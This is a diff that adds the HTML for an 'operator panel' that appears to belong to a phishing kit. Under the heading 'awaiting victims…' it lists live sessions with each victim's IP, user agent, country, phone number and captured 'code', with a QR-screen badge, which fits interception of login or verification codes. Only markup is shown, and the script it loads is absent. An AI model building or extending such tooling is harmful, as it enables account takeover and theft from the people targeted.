@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>sup — operator panel</title>
+  <link rel="stylesheet" href="./op.css" />
+</head>
+<body>
+  <header class="bar">
+    <div class="brand">
+      <span class="dot" id="wsDot"></span>
+      <span class="brand__name">sup // operator</span>
+    </div>
+    <div class="bar__stats">
+      <span><b id="liveCount">0</b> live</span>
+      <span class="sep">·</span>
+      <span><b id="totalCount">0</b> total</span>
+      <span class="sep">·</span>
+      <label class="mute">
+        <input type="checkbox" id="soundToggle" /> sound
+      </label>
+    </div>
+  </header>
+
+  <main class="grid" id="grid">
+    <div class="empty" id="empty">
+      <div class="empty__title">awaiting victims…</div>
+      <div class="empty__sub">панель подключена, ждём ws-сессии</div>
+    </div>
+  </main>
+
+  <template id="cardTpl">
+    <article class="card" data-sid="">
+      <header class="card__head">
+        <span class="card__sid"></span>
+        <span class="card__screen badge">qr</span>
+        <span class="card__time"></span>
+      </header>
+      <div class="card__row"><span class="k">ip</span><span class="v ip"></span></div>
+      <div class="card__row"><span class="k">ua</span><span class="v ua"></span></div>
+      <div class="card__row"><span class="k">country</span><span class="v country">—</span></div>
+      <div class="card__row"><span class="k">phone</span><span class="v phone live">—</span></div>
+      <div class="card__row code-row"><span class="k">code</span><span class="v code">—</span></div>
+      <footer class="card__log"></footer>
+    </article>
+  </template>
+
+  <div class="toast-wrap" id="toasts"></div>
+
+  <script src="./op.js"></script>
+</body>
+</html>
